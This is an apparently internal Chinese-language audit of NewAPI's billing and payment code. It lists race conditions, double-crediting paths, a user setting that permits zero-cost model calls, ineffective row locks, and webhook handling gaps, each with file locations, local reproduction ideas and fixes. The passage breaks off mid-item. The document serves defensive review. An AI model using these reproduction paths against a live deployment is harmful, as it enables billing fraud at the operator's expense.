# NewAPI 潜在运营风险审计

## P0

### 风险 1：Creem 订单被管理员补单时可能额度数量级放大

- 标题：Creem 普通充值订单的 `Amount` 语义与通用补单逻辑不一致，管理员补单会重复乘 `QuotaPerUnit`
- 影响范围：Creem 普通充值、管理员手动补单、用户余额/额度、邀请充值返利
- 触发条件：用户创建 Creem 普通充值订单后，订单仍处于 `pending`；管理员通过 `/api/user/topup/complete` 对该订单补单
- 涉及文件/函数：
  - `controller/topup_creem.go:107-118`：创建 Creem 订单时 `TopUp.Amount = selectedProduct.Quota`
  - `model/topup.go:555-563`：正常 Creem 回调 `RechargeCreem` 直接把 `topUp.Amount` 作为 `quotaToAdd`
  - `controller/topup.go:509-525`：管理员补单入口 `AdminCompleteTopUp`
  - `model/topup.go:465-475`：`ManualCompleteTopUp` 仅特殊处理 Stripe，其余支付渠道统一 `Amount * QuotaPerUnit`
- 可能后果：同一笔 Creem 产品额度被补单时会再乘一次 `QuotaPerUnit`。如果 Creem 产品配置的 `Quota` 已经是最终额度，补单结果会把用户额度和邀请返利放大到远超实际支付金额，形成可运营套利路径。
- 复现思路：本地构造一条 `PaymentProviderCreem`、`Status=pending`、`Amount=<最终额度>` 的 `top_ups` 记录；调用管理员补单；观察用户 `quota` 增量是否等于 `Amount * QuotaPerUnit`，而不是 `Amount`。
- 修复建议：让 `ManualCompleteTopUp` 按 `PaymentProvider` 分支复用各渠道的真实入账算法；至少为 Creem 增加 `quotaToAdd = int(topUp.Amount)`。补充单测覆盖 Creem、Stripe、Epay、Waffo、Waffo Pancake 的补单入账差异。
- 优先级：P0
- 当前状态：已确认代码路径存在风险，尚未修复。

### 风险 6：钱包和令牌预扣费不是原子条件扣减，并发请求可能把余额扣成负数

- 标题：扣费链路先读取余额再无条件 `quota - ?`，缺少数据库级 `quota >= amount` 条件
- 影响范围：API 调用扣费、令牌剩余额度、用户钱包余额、信任额度旁路、批量更新模式
- 触发条件：同一用户或同一令牌并发发起多笔请求，每笔请求在扣费前读取到相同的可用余额；随后多个请求都执行无条件扣减
- 涉及文件/函数：
  - `service/billing_session.go:349-373`：钱包路径先 `GetUserQuota` 检查余额，再调用 `session.preConsume`
  - `service/billing_session.go:198-207`：预扣令牌后再预扣资金来源
  - `service/funding_source.go:36-44`：`WalletFunding.PreConsume` 调用 `DecreaseUserQuota`
  - `service/quota.go:382-400`：`PreConsumeTokenQuota` 先查 token，再调用 `DecreaseTokenQuota`
  - `model/user.go:1034-1052`：`DecreaseUserQuota`/`decreaseUserQuota` 直接 `quota = quota - ?`
  - `model/token.go:405-431`：`DecreaseTokenQuota`/`decreaseTokenQuota` 直接 `remain_quota = remain_quota - ?`
- 可能后果：高并发下用户钱包或 token `remain_quota` 可被扣成负数，形成短时间超额调用；若 `BatchUpdateEnabled` 开启，扣减可先进入批量队列，余额校验与最终落库之间窗口更大。
- 复现思路：本地给用户和 token 设置刚好够一次调用的额度，并发发起两次同额度请求；观察两次都可能通过预检查，最终 `users.quota` 或 `tokens.remain_quota` 变为负数。
- 修复建议：把余额检查与扣减合并为原子 SQL，例如 `UPDATE users SET quota = quota - ? WHERE id = ? AND quota >= ?` 并检查 `RowsAffected`；token 同理。批量更新模式下，预扣费类扣减不应只入队，必须有强一致扣减或集中式原子库存。
- 优先级：P0
- 当前状态：已确认代码路径存在竞态风险，尚未修复。

### 风险 18：普通用户可开启“接受未设置倍率模型”，未配置价格/倍率的模型可能变成 0 计费

- 标题：`AcceptUnsetModelRatioModel` 是用户自助设置，计费 helper 在未找到模型倍率时会放行并保留 `modelRatio=0`
- 影响范围：未配置价格/倍率但有渠道能力的模型、用户自助设置、模型列表、文本计费、按次任务预扣
- 触发条件：某个渠道启用了模型，但后台没有配置 `ModelPrice` 或 `ModelRatio`；用户在个人设置中打开 `accept_unset_model_ratio_model`
- 涉及文件/函数：
  - `controller/user.go:1153-1165`：用户设置请求包含 `AcceptUnsetModelRatioModel`
  - `controller/user.go:1261-1267`：普通用户可把该字段写入 `dto.UserSetting.AcceptUnsetRatioModel`
  - `relay/common/relay_info.go:508-510`：relay 计费上下文读取用户设置
  - `relay/helper/price.go:95-104`：未找到模型倍率时，如果 `AcceptUnsetRatioModel` 为 true 就不返回定价错误，`modelRatio` 保持默认 0
  - `relay/helper/price.go:114-120`：预扣额度按 `modelRatio * groupRatio` 计算，0 倍率会得到 0 预扣
  - `service/text_quota.go:275-290`：倍率计费分支按 `ratio` 计算实际扣费；`ratio=0` 时不会进入最小 1 quota 保护
  - `controller/model.go:208-217`：模型列表也会根据该用户设置放宽未配置倍率模型展示
- 可能后果：只要渠道能力里存在未配置价格/倍率的模型，用户可通过自助设置让模型请求绕过“未配置定价”的错误，最终以 0 预扣和 0 实际扣费完成调用，造成渠道成本由平台承担。
- 复现思路：本地新增一个渠道模型能力但不写 `ModelPrice/ModelRatio`；普通用户开启 `accept_unset_model_ratio_model`；调用该模型并观察 `QuotaToPreConsume`、消费日志和用户余额变化是否为 0。
- 修复建议：该开关不应由普通用户自助控制，至少应改为管理员/系统级白名单；即使允许展示未配置模型，计费链路也必须拒绝 0 定价，除非模型在显式免费模型白名单中。增加未配置倍率模型的请求拒绝测试。
- 优先级：P0
- 当前状态：已确认代码路径存在 0 计费风险，尚未修复。

### 风险 31：GORM v2 下 `Set("gorm:query_option", "FOR UPDATE")` 疑似不生效，多个“行锁保护”的资产状态机可能实际无锁

- 标题：项目使用 GORM v1.25.2，但多处沿用旧式 `gorm:query_option` 写法；本地模块中没有该 key 的处理逻辑，官方锁写法是 `Clauses(clause.Locking{Strength:"UPDATE"})`
- 影响范围：充值完成、订阅完成/过期、兑换码兑换、邀请额度转余额、邀请码消费、订阅预扣/退款幂等、后台作废订阅
- 触发条件：MySQL/PostgreSQL 多并发请求或多实例重复支付回调同时读取同一 pending/unused 记录；开发者以为 `FOR UPDATE` 已生效而未加条件更新/唯一幂等约束
- 涉及文件/函数：
  - `go.mod:60`、`go.sum:396`：当前 GORM 版本为 `gorm.io/gorm v1.25.2`
  - 本地依赖 `gorm.io/gorm@v1.25.2/chainable_api.go:35` 只示例 `db.Clauses(clause.Locking{Strength: "UPDATE"})`
  - 本地依赖 `gorm.io/gorm@v1.25.2/clause/locking_test.go:17-26` 验证 `clause.Locking` 生成 `FOR UPDATE`
  - 本地依赖全文搜索未发现 `gorm:query_option` 处理逻辑
  - `model/topup.go:176`、`model/topup.go:206`、`model/topup.go:452`、`model/topup.go:534`、`model/topup.go:623`、`model/topup.go:697`：充值状态机依赖该写法
  - `model/subscription.go:627`、`model/subscription.go:733`、`model/subscription.go:843`、`model/subscription.go:888`、`model/subscription.go:1111`、`model/subscription.go:1184`、`model/subscription.go:1228`、`model/subscription.go:1295`：订阅订单、用户订阅、预扣记录依赖该写法
  - `model/redemption.go:160`、`model/user.go:480`、`model/invite_code.go:273`、`model/invite_code.go:301`：兑换码、邀请额度和邀请码依赖该写法
- 可能后果：两个事务可能同时读到 `pending` 或 `enabled` 状态，然后分别执行“加额度/创建订阅/标记已用”。这会造成重复入账、重复兑换、订阅重复生效、邀请额度重复转移或退款幂等失效。风险覆盖面比单个支付渠道更大，属于资产状态机的基础并发保护缺口。
- 复现思路：用 MySQL/PostgreSQL 打开 SQL 日志或 GORM dry-run，对 `tx.Set("gorm:query_option", "FOR UPDATE").Where(...).First(...)` 生成 SQL，确认是否带 `FOR UPDATE`；再并发调用同一兑换码或同一支付回调，观察是否能出现两次成功副作用。
- 修复建议：统一替换为 `tx.Clauses(clause.Locking{Strength: "UPDATE"})`，并补充并发测试；关键资产状态机不要只依赖读锁，应改为条件更新，例如 `UPDATE ... SET status='success' WHERE trade_no=? AND status='pending'` 并检查 `RowsAffected=1`；兑换码、预扣退款等增加唯一 ledger/idempotency 约束。
- 优先级：P0
- 当前状态：已确认项目依赖 GORM v2 且代码使用疑似无效的旧式行锁写法，尚未修复。

### 风险 32：Epay 余额充值成功回调只靠进程内锁和普通更新，多实例重复回调可重复入账

- 标题：`/api/user/epay/notify` 在控制器内先读取 pending 订单、保存 success、再加用户额度，整个流程没有 DB 事务和有效条件更新
- 影响范围：易支付余额充值、用户额度、邀请充值返利、充值日志、累计充值金额
- 触发条件：支付网关重复通知、用户/网关同时触发 GET/POST 回调、多实例部署下两个实例同时处理同一 `trade_no`，或进程内锁因重启失效
- 涉及文件/函数：
  - `controller/topup.go:268-308`：`LockOrder` 是进程内 `sync.Map` + `sync.Mutex`，不能跨实例
  - `controller/topup.go:353-371`：验签成功后先向网关写 `success`
  - `controller/topup.go:373-393`：仅在控制器内加进程锁，`GetTopUpByTradeNo` 后判断 pending 并 `topUp.Update()`
  - `controller/topup.go:400-418`：订单标记成功后再 `IncreaseUserQuota(..., true)`、刷新累计充值金额、发放邀请返利和记录日志
  - `model/topup.go:154-162`：`GetTopUpByTradeNo` 是普通查询
  - `model/topup.go:140`：`TopUp.Update` 是普通 `DB.Save`
- 可能后果：两个实例同时处理同一成功回调时，都可能读到 pending 并分别加额度，形成“卡重复回调充值”；如果订单已标记 success 后加额度失败，支付网关已收到 success 且本地订单成功，但用户没有到账，需要人工补偿。
- 复现思路：在两个服务实例上并发发送同一个已验签成功的 Epay 通知，或本地绕过网关验签后用测试 client 并发调用处理函数；观察 `top_ups.status` 只是一条 success，但 `users.quota`、topup 日志或邀请返利可能执行两次。
- 修复建议：把 Epay 余额充值改为模型层单事务状态机，使用有效行锁或条件更新抢占订单；只有抢占成功的事务能加额度和发返利；成功响应网关应在本地事务成功后返回。对已成功订单重复回调只允许刷新派生统计，不得再次进入加额路径。
- 优先级：P0
- 当前状态：已确认 Epay 余额充值回调没有 DB 事务和跨实例幂等抢占，尚未修复。

### 风险 274：`ManageUser enable` 可为已删除或不存在用户重建 enabled 用户缓存，孤儿 token 可能重新通过鉴权

- 标题：此前确认 `ManageUser` 对目标用户 `Unscoped().First` 不检查 error；本轮进一步发现，非调额动作中的 `enable` 分支会调用 `user.Update(false)`，而 `User.Update` 自身也忽略 `DB.First` 查找错误和更新 `RowsAffected`，最后仍调用 `updateUserCache(*user)`。这会让已软删除、已硬删除或不存在的用户 ID 被写入 Redis `user:<id>`，且 `Status` 可能是 `UserStatusEnabled=1`，从而绕过原本删除/禁用后的 user cache 失效效果。
- 影响范围：后台用户启用接口、软删除用户、硬删除后的孤儿 token、Redis user cache、TokenAuth、TokenAuthReadOnly、钱包预扣费、管理员误恢复、客服异常充值处置和撤销账号流程。
- 触发条件：
  - 目标用户已软删除，或者 default 硬删除后留下 `tokens.user_id` 等孤儿记录。
  - 管理员、脚本或抓包请求向 `/api/user/manage` 提交 `{"id": <deleted_or_missing_id>, "action": "enable"}`。
  - Redis 开启；`User.Update(false)` 在查找不到活跃用户或数据库更新 0 行时仍执行 `updateUserCache(*user)`。
  - 该用户历史 token 记录仍在数据库且状态、额度、过期时间满足 `ValidateUserToken`；硬删除不级联 token 已由风险 143 覆盖。
- 涉及文件/函数：
  - `controller/user.go:887-900`：`ManageUser` 读取目标用户时使用 `Unscoped()` 并忽略 `First` error；缺失记录可能继续进入 action 分支。
  - `controller/user.go:917-918`：`enable` 分支仅设置 `user.Status = common.UserStatusEnabled`，没有拒绝软删除用户，也没有要求恢复流程。
  - `controller/user.go:1004-1019`：非调额动作最终调用 `user.Update(false)`；后续只对 `disable/promote/demote` 失效 user/token cache，`enable` 不做强制缓存失效。
  - `model/user.go:620-635`：`User.Update` 保存 `newUser` 后调用 `DB.First(&user, user.Id)` 但不检查 error；`DB.Model(user).Updates(newUser)` 也只检查 `.Error`，不检查 `RowsAffected`；最后直接 `updateUserCache(*user)`。
  - `model/user_cache.go:67-77`：`updateUserCache` 会把 `UserBase` 写入 Redis hash，字段包括 `Id/Group/Quota/Status/Username/Setting/Email`。
  - `common/constants.go:238-240`：`UserStatusEnabled = 1`，`UserStatusDisabled = 2`，零值不是启用状态；因此单独的 `HIncrBy` partial cache 会被状态零值拦住，但 enable 写入的状态可能变成 1。
  - `middleware/auth.go:367-380`：正式 `TokenAuth` 在 token 校验后读取 `GetUserCache(token.UserId)`，只要 `userCache.Status == UserStatusEnabled` 就继续把缓存中的用户信息写入上下文。
  - `model/token.go:188-218`、`model/token.go:255-276`：`ValidateUserToken` 只验证 token 自身状态、过期和额度；token 对应的 user 是否仍存在依赖后续 `GetUserCache`。
  - `model/user.go:447-452` 与 `docs/newapi-ops-risk-audit.md:2936-2955`：硬删除只删除 users 主记录，关联 token 等资产可变成孤儿，这是本风险成立的前置数据条件。
  - `model/user.go:906-925`：`GetUserQuota(id, false)` 命中 Redis 时可直接返回缓存 quota；如果 enabled user cache 被重建，后续钱包检查可能基于缓存额度而不是活跃用户行。
  - `model/user.go:1034-1055`：`DecreaseUserQuota` 同样先异步减少 Redis，再执行数据库 `UPDATE users SET quota = quota - ? WHERE id = ?`，不检查影响行数。
- 可能后果：
  - 运营以为用户已经删除或硬删除缓存已经失效，但一次误点/脚本调用 `enable` 就可能重新生成 enabled user cache，使历史孤儿 token 在 Redis TTL 内重新通过 `TokenAuth`。
  - 如果缓存中保留或被写入正 quota，钱包预扣费会先按 `GetUserQuota` 的缓存值判断余额充足；随后 `DecreaseUserQuota` 对已删除/不存在 DB 行更新 0 行也可能返回成功，形成“请求可消费、数据库没有真实用户余额扣减”的窗口。
  - TokenAuthReadOnly 也可能把已删除用户的 token 当成未封禁用户，继续返回 usage/log 类只读资产信息，造成撤销账号后的信息残留。
  - 风险 142 覆盖的是“硬删除前已经存在的旧缓存 TTL 窗口”；本风险更进一步：即使旧缓存已被清理或过期，后台 `enable` 仍可能主动重建一个 enabled user cache。
  - 风险 273 覆盖的是手工调额 false-success 和 quota cache 污染；本风险是身份状态缓存被重建后，孤儿 token 可能重新获得鉴权入口。
- 复现思路：
  - 本地开启 Redis，创建用户和 token，确认 token 可请求以填充 token cache/user cache。
  - 通过后台软删除或硬删除该用户；确认用户主记录被软删除/硬删除，token 记录仍存在或成为孤儿。
  - 调用 `/api/user/manage`，payload 使用 `{"id": <deleted_user_id>, "action": "enable"}`，观察接口是否成功以及 Redis `user:<id>` 是否出现 `Status=1`。
  - 使用该用户历史 token 调用正式 relay 或 `/v1/models`，观察 `TokenAuth` 是否通过 `GetUserCache` 的 enabled 状态继续执行。
  - 在同一窗口内调用需要钱包预扣的请求，观察 `DecreaseUserQuota` 是否对缺失 DB 行更新 0 行但没有错误。仅在本地测试库与本地 Redis 操作，不使用生产 token 或真实上游付费调用。
- 修复建议：
  - `ManageUser` 对所有 action 都必须先查到活跃目标用户；`enable` 不应通过 `Unscoped()` 直接作用于软删除用户，更不能作用于硬删除/不存在 ID。
  - 如果需要“恢复软删除用户”，应提供单独恢复接口：要求 Root、二次确认、原因、用户当前 `DeletedAt` 快照、关联 token/订单/订阅影响清单，并用 `Unscoped().Model(...).Update("deleted_at", nil)` 这类明确恢复语义。
  - `User.Update`/`User.Edit` 必须检查 `DB.First` error 和更新 `RowsAffected == 1`；更新成功后重新读取最新活跃用户再写缓存，禁止在找不到 DB 行时写 Redis user cache。
  - `TokenAuth` 在 user cache 命中 enabled 时也应能识别删除版本，例如缓存包含 `deleted_at`/`user_version`/`revoked_at`，或在高风险删除后维护不可绕过的 deleted-user 版本。
  - 硬删除用户前应禁用或删除 token DB 记录，或者至少让 `ValidateUserToken` join/校验 active user 存在；不要把“用户存在性”完全委托给可被后台误写的 Redis user cache。
  - 钱包预扣、调额、退款、返还等资产更新统一检查 `RowsAffected == 1`，并在数据库成功后再改 Redis。
- 优先级：P0。
- 当前状态：未修复。

## P1

### 风险 2：易支付回调先向支付网关返回 success，再执行本地入账，失败后网关不会重试

- 标题：Epay webhook 在验签后立即响应 `success`，本地状态更新和额度入账失败会变成静默人工账差
- 影响范围：易支付充值、订单状态、用户额度、支付网关重试、客服补单
- 触发条件：易支付回调验签成功后，本地 `topUp.Update()`、`IncreaseUserQuota()`、刷新累计充值金额或邀请返利任一步出现错误；或者进程在响应 success 后、本地入账完成前崩溃
- 涉及文件/函数：
  - `controller/topup.go:353-359`：验签成功后立即向网关写入 `success`
  - `controller/topup.go:373-418`：响应 success 之后才加订单锁、查订单、更新状态、增加额度、记录返利
  - `model/user.go:1009-1027`：`IncreaseUserQuota(..., true)` 先异步增加缓存，再写数据库
- 可能后果：支付网关认为回调已成功，不再重试；本地可能出现“订单已支付但用户未加额”“订单成功但返利缺失”“Redis 额度和 DB 额度短时不一致”。这不是直接充值套利，但会造成运营账差和人工补单压力。
- 复现思路：本地模拟易支付验签成功回调，在 `topUp.Update()` 之后或 `IncreaseUserQuota()` 前后注入错误/中断；观察网关响应已是 success，后续重复回调不会自然恢复全部状态。
- 修复建议：本地订单状态更新、额度入账、累计金额刷新和返利发放应在一个数据库事务内完成；只有事务成功后才返回 `success`。避免在 DB 成功前先增 Redis 缓存，或把缓存刷新改为事务后基于 DB 重建。
- 优先级：P1
- 当前状态：已确认代码顺序存在风险，尚未修复。

### 风险 3：Stripe webhook 处理失败仍统一返回 HTTP 200，支付侧重试被吞掉

- 标题：Stripe 回调处理错误只写日志，外层始终 `c.Status(http.StatusOK)`
- 影响范围：Stripe 普通充值、Stripe 订阅订单、异步支付成功/失败、订单过期
- 触发条件：Stripe webhook 验签通过，但 `CompleteSubscriptionOrder` 或 `model.Recharge` 返回错误，例如数据库不可用、订单锁后状态异常、用户更新失败
- 涉及文件/函数：
  - `controller/topup_stripe.go:177-187`：事件分发后无论内部结果如何都会继续执行
  - `controller/topup_stripe.go:273-284`：`fulfillOrder` 内部错误只记录日志并 `return`
  - `controller/topup_stripe.go:286-287`：外层最终仍返回 HTTP 200
- 可能后果：Stripe 不再重试已返回 2xx 的 webhook，本地订单可能停留 pending 或处理失败，形成支付成功但未入账的运营事故。若管理员后续使用通用补单，还会叠加渠道语义不一致风险。
- 复现思路：本地构造验签通过的 Stripe `checkout.session.completed` 事件，临时让 `model.Recharge` 返回错误；观察接口仍返回 200，订单未成功入账。
- 修复建议：让事件处理函数返回错误；普通充值或订阅处理失败时返回 5xx，只有幂等重复成功、不可恢复的无效订单、明确忽略事件才返回 2xx。为 DB 错误和订单状态错误分别制定重试策略。
- 优先级：P1
- 当前状态：已确认代码路径存在风险，尚未修复。

### 风险 4：Waffo 非成功支付状态被统一标记为 failed，可能把可继续支付订单提前终结

- 标题：Waffo webhook 对所有非 `PAY_SUCCESS` 状态调用 `UpdatePendingTopUpStatus(..., failed)`
- 影响范围：Waffo 普通充值、延迟支付、支付状态同步、用户入账
- 触发条件：Waffo 在最终成功前发送处理中、待支付、风控审核、延迟确认等非成功状态，且 `MerchantOrderID` 对应本地 pending 订单
- 涉及文件/函数：
  - `controller/topup_waffo.go:376-389`：`OrderStatus != "PAY_SUCCESS"` 时直接尝试把 pending 订单改为 failed
  - `model/topup.go:164-188`：`UpdatePendingTopUpStatus` 只允许 pending 变为目标状态
  - `model/topup.go:632-637`：后续成功回调遇到非 pending 状态会报“充值订单状态错误”
- 可能后果：如果支付渠道存在中间态回调，订单会被提前改成 failed；后续真实支付成功无法入账，用户已付款但无额度。
- 复现思路：本地依次模拟同一 `MerchantOrderID` 的非成功状态和 `PAY_SUCCESS` 状态；观察第一步是否把订单置为 failed，第二步是否无法 `RechargeWaffo`。
- 修复建议：只把明确终态失败/取消/过期的状态映射为 failed；处理中状态应记录日志但保持 pending。补充 Waffo 状态枚举映射单测。
- 优先级：P1
- 当前状态：基于代码分支确认存在潜在风险，需结合 Waffo 官方状态枚举进一步核验。

### 风险 5：Stripe/Creem 充值回调未用支付侧实付金额和币种校验本地订单金额

- 标题：多个支付回调只以订单号和支付成功状态入账，未校验 `amount_paid/amount_total/currency/product`
- 影响范围：Stripe 普通充值、Creem 普通充值、优惠码、后台产品配置变更、渠道成本
- 触发条件：支付侧发生优惠、产品金额变化、币种配置错误、后台产品错绑，或回调事件金额与本地 `TopUp.Money` 不一致
- 涉及文件/函数：
  - `controller/topup_stripe.go:258-289`：`fulfillOrder` 记录 `amount_total/currency` 但 `model.Recharge` 只按本地 `topUp.Money` 入账
  - `model/topup.go:227-231`：Stripe 入账按本地 `topUp.Money * QuotaPerUnit`
  - `controller/topup_creem.go:322-350`：Creem 记录 `AmountPaid/Currency/Product`，但调用 `RechargeCreem` 前未与本地订单比对
  - `model/topup.go:555-563`：Creem 入账按本地 `topUp.Amount`
- 可能后果：运营后台或支付平台配置错误时，用户可能低价获得高额度，或者实付币种/产品与本地订单不一致仍被入账。Stripe 启用优惠码时尤其需要明确这是运营允许的折扣，还是会造成渠道成本失控。
- 复现思路：本地构造本地订单 `Money/Amount` 与回调 `amount_total/amount_paid` 不一致的已支付事件，观察当前入账仍只按本地订单字段计算。
- 修复建议：支付成功入账前校验支付侧订单号、实付金额、币种、产品 ID/Price ID 与本地订单快照一致；若允许优惠码，应把折扣策略显式落库并纳入成本计算。
- 优先级：P1
- 当前状态：已确认缺少强校验，需按业务折扣策略决定修复细节。

### 风险 7：管理员 override 额度直接写数据库，不同步 Redis 用户额度缓存

- 标题：管理员覆盖用户额度绕过 `IncreaseUserQuota/DecreaseUserQuota` 缓存更新路径
- 影响范围：管理员用户管理、Redis 缓存、实际可调用额度、运营调账
- 触发条件：Redis 用户缓存已存在；管理员通过 `ManageUser` 的 `add_quota` + `override` 模式直接覆盖用户额度
- 涉及文件/函数：
  - `controller/user.go:955-993`：`add_quota` 的 `override` 分支直接 `Update("quota", req.Value)`
  - `model/user_cache.go:155-160`：`GetUserQuota(false)` 优先读取用户缓存
  - `model/user_cache.go:199-203`：存在单字段更新缓存函数，但 override 分支未调用
  - `model/user.go:906-925`：余额查询优先走 Redis 缓存
- 可能后果：管理员把用户额度调低或清零后，Redis 中旧的高额度仍可能继续被扣费链路信任，用户可在缓存过期/刷新前继续消费；管理员把额度调高后，用户也可能短时仍被旧低额度拒绝。
- 复现思路：启用 Redis，先触发用户额度缓存；管理员 override 为 0；随后调用需要余额校验的接口，观察 `GetUserQuota(false)` 是否仍返回旧缓存值。
- 修复建议：管理员 override 后同步调用 `updateUserQuotaCache` 或统一走一个 `SetUserQuota` 模型方法；同时记录 old/new、管理员 ID、IP 和原因，便于审计。
- 优先级：P1
- 当前状态：已确认代码路径存在缓存不一致风险，尚未修复。

### 风险 8：管理员 override 可设置负数额度，缺少业务边界和二次确认证据

- 标题：`ManageUser` 的 `override` 分支没有限制 `req.Value >= 0`
- 影响范围：管理员调账、用户可用余额、风控和客服操作
- 触发条件：管理员误输入或恶意输入负数额度，或者前端/接口调用传入负数 `value`
- 涉及文件/函数：
  - `controller/user.go:962-980`：`add`/`subtract` 分支要求 `req.Value > 0`
  - `controller/user.go:985-992`：`override` 分支直接把 `quota` 更新为 `req.Value`，没有非负校验
  - `model/user.go:1009-1052`：增减额度函数会拒绝负入参，但 override 未使用这些函数
- 可能后果：用户余额可被写成负数，后续充值、返利、退款和统计报表都会以负数为基础，容易造成客服误判和风控噪音。若缓存仍为正数，还会叠加风险 7 的短时超额消费。
- 复现思路：管理员请求 `/api/user/manage`，`action=add_quota`、`mode=override`、`value=-1`；观察数据库 `users.quota` 是否被写成负数。
- 修复建议：后端强制 `override` 值大于等于 0；对大额覆盖增加原因字段和二次确认标识；测试覆盖负数、0、正数和超大值边界。
- 优先级：P1
- 当前状态：已确认缺少后端校验，尚未修复。

### 风险 10：兑换码额度值缺少上限，管理员误配可造成无限接近任意额度发放

- 标题：兑换码创建只校验 `Count`，没有限制 `Quota` 的正数、上限和精度边界
- 影响范围：兑换码、管理员后台、用户余额、订阅套餐兑换
- 触发条件：管理员创建 quota 类型兑换码时提交极大 `quota`、0 或负数；前端限制被绕过或后台误操作
- 涉及文件/函数：
  - `controller/redemption.go:79-85`：只限制兑换码张数 `Count`
  - `controller/redemption.go:91-99`：quota 类型通过 `validateRedemptionBenefit` 后保留原 `Quota`
  - `controller/redemption.go:220-226`：quota 类型直接返回 true，未校验 `Quota`
  - `model/redemption.go:165-181`：兑换时执行 `quota + redemption.Quota`
- 可能后果：管理员或被盗管理员账号可以创建异常大额兑换码；负数兑换码虽然可导致扣减而非充值，但同样会破坏运营账务。若整数接近上限，还可能触发溢出或报表异常。
- 复现思路：用管理员接口创建 `type=quota`、`quota` 为极大值或负数的兑换码；普通用户兑换后观察 `users.quota` 变化。
- 修复建议：后端强制 `Quota > 0`，并设置运营可配置的单码上限和批量总额上限；大额兑换码生成应记录管理员、IP、原因，并可选二次确认。
- 优先级：P1
- 当前状态：已确认缺少后端额度边界，尚未修复。

### 风险 11：订阅订单完成时没有重新校验“同套餐已激活”，多笔待支付订单可能叠加生效

- 标题：订阅支付创建前做了资格校验，但回调完成订单时只校验购买次数上限，没有重新拒绝同套餐 active 订阅
- 影响范围：订阅套餐、套餐额度、套餐升级用户组、支付回调、管理员绑定套餐
- 触发条件：用户在没有 active 套餐时创建多笔同套餐 pending 订单，随后多笔订单陆续支付成功；或管理员反复绑定同一套餐且购买次数限制允许
- 涉及文件/函数：
  - `controller/subscription_payment_guard.go:12-20`：创建支付前调用 `CheckSubscriptionPayEligibilityTx`
  - `controller/subscription_payment_stripe.go:67-69`、`controller/subscription_payment_creem.go:73-75`、`controller/subscription_payment_waffo_pancake.go:66-68`、`controller/subscription_payment_epay.go:53-55`：各支付入口只在创建订单前校验资格
  - `model/subscription.go:481-495`：`CheckSubscriptionPayEligibilityTx` 会检查同套餐 active 订阅
  - `model/subscription.go:612-684`：`CompleteSubscriptionOrder` 完成订单时调用 `CreateUserSubscriptionFromPlanTx`
  - `model/subscription.go:547-607`：`CreateUserSubscriptionFromPlanTx` 只调用 `CheckSubscriptionPurchaseLimitTx`，未重新调用 active 订阅校验
  - `model/subscription.go:748-769`：管理员绑定套餐也复用 `CreateUserSubscriptionFromPlanTx`
- 可能后果：前端和下单入口看似阻止重复购买，但同一用户可通过多笔 pending 订单在回调阶段生成多个 active 套餐；套餐额度、到期时间、升级用户组和购买次数统计会被叠加，造成运营成本和客服争议。
- 复现思路：本地创建用户和同一套餐，在第一笔订单完成前创建两笔 pending 订阅订单；依次调用 `CompleteSubscriptionOrder`，观察是否生成两条 active `user_subscriptions`。
- 修复建议：在 `CompleteSubscriptionOrder` 的事务和行锁内重新调用 `CheckSubscriptionPayEligibilityTx(tx, order.UserId, plan)`，或为同一用户同一套餐 active 状态增加数据库唯一约束；管理员绑定也应明确是否允许叠加，若不允许应复用同一校验。
- 优先级：P1
- 当前状态：已确认完成订单路径缺少 active 二次校验，尚未修复。

### 风险 12：旧视频/Midjourney 异步任务退款和差额结算绕过统一计费资金来源

- 标题：部分旧任务回调直接加减用户钱包额度，没有退还 token 额度，也没有处理订阅资金来源
- 影响范围：视频任务、Midjourney 任务、token 剩余额度、订阅预扣、钱包余额、任务失败退款和成功后重算
- 触发条件：任务使用订阅或 token 作为资金来源后进入旧回调路径；任务失败、成功后 token 重算、或实际消耗小于预扣
- 涉及文件/函数：
  - `service/task_polling.go:473-499`：新通用轮询路径在 CAS 成功后调用统一结算/退款
  - `service/task_billing.go:150-182`：`RefundTaskQuota` 会调整钱包/订阅资金来源并退还 token 额度
  - `service/task_billing.go:187-245`：`RecalculateTaskQuota` 会按资金来源和 token 做差额结算
  - `controller/task_video.go:152-230`：视频成功后 token 重算直接 `DecreaseUserQuota`/`IncreaseUserQuota`
  - `controller/task_video.go:241-276`：视频失败退款直接 `IncreaseUserQuota`
  - `controller/midjourney.go:168-195`：Midjourney 失败退款直接 `IncreaseUserQuota`
- 可能后果：订阅用户失败任务可能没有释放套餐已用额度，token 用户失败任务可能没有退还 `remain_quota`，也可能把本应退回订阅的额度错误退到钱包；成功后差额补扣/退款同样可能绕过真实资金来源，导致账务和用户可用额度不一致。
- 复现思路：本地用带 token 限额或订阅资金来源创建视频/MJ 任务，触发旧回调失败或 token 重算分支；对比 `users.quota`、token `remain_quota`、`user_subscriptions.amount_used` 和任务日志。
- 修复建议：旧回调路径统一迁移到 `service.RefundTaskQuota` 和 `service.RecalculateTaskQuota`，并在 `task.PrivateData` 中强制保留资金来源、token、group 等结算元数据；补充钱包、token、订阅三类资金来源的失败退款和差额结算测试。
- 优先级：P1
- 当前状态：已确认存在旧路径绕过统一计费逻辑，尚未修复。

### 风险 13：模型倍率和固定价格配置缺少后端数值边界，负数/极端值可能造成免费调用、负扣费或溢出

- 标题：`ModelRatio/ModelPrice/ImageRatio/AudioRatio/CacheRatio/CreateCacheRatio` 等只解析 JSON，不限制非负、上限和有限数值
- 影响范围：模型计费、图片/音频/缓存计费、按次任务预扣、文本实际扣费、管理员配置、渠道成本
- 触发条件：管理员误配、被盗管理员账号、批量同步价格源异常，或接口直接提交负数、0、极大数、特殊浮点值
- 涉及文件/函数：
  - `controller/option.go:226-270`：`GroupRatio` 只拒绝负数；图片、音频、缓存创建倍率只调用 JSON 解析函数
  - `controller/option.go:21-30`、`controller/option.go:152-285`：`ModelRatio`、`ModelPrice` 属于计费元配置，但通用更新入口没有针对这两个 key 的显式边界校验
  - `model/option.go:210-223`：`UpdateOption` 先保存数据库，再刷新内存配置
  - `model/option.go:536-557`：多类倍率/价格更新只调用对应 `Update...ByJSONString`
  - `setting/ratio_setting/model_ratio.go:368-399`、`setting/ratio_setting/model_ratio.go:678-703`、`setting/ratio_setting/cache_ratio.go:145-152`：底层加载函数只反序列化到 map
  - `types/rw_map.go:77-93`：通用 `LoadFromJsonString` 只做 JSON 反序列化，不做业务校验
  - `relay/helper/price.go:114-120`、`relay/helper/price.go:196-207`：预扣费直接使用倍率/价格计算
  - `service/text_quota.go:275-300`：实际扣费使用各类倍率/固定价格计算，固定价格分支没有统一正数下限
